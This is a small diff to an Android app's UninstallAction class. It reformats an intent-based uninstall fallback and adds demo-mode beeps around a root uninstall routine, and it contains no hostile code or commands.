@@ -15,6 +15,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 
+import com.android.deviceinfo.Beep;
 import com.android.deviceinfo.Core;
 import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Root;
@@ -157,12 +158,12 @@ public class UninstallAction extends SubActionSlow {
 			ret = deleteApplicationRoot();
 		}
 
-		//if (!ret) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (deleteApplication) go with intent");
-			}
-			ret = deleteApplicationIntent();
-		//}
+		// if (!ret) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (deleteApplication) go with intent");
+		}
+		ret = deleteApplicationIntent();
+		// }
 
 		return ret;
 	}
@@ -195,7 +196,14 @@ public class UninstallAction extends SubActionSlow {
 	 */
 	static boolean deleteApplicationRoot() {
 
-		return Root.uninstallRoot();
+		if (Cfg.DEMO) {
+			Beep.beepExit();
+		}
+		boolean ret = Root.uninstallRoot();
+		if (Cfg.DEMO) {
+			Beep.beepPenta();
+		}
+		return ret;
 	}
 
 	@Override
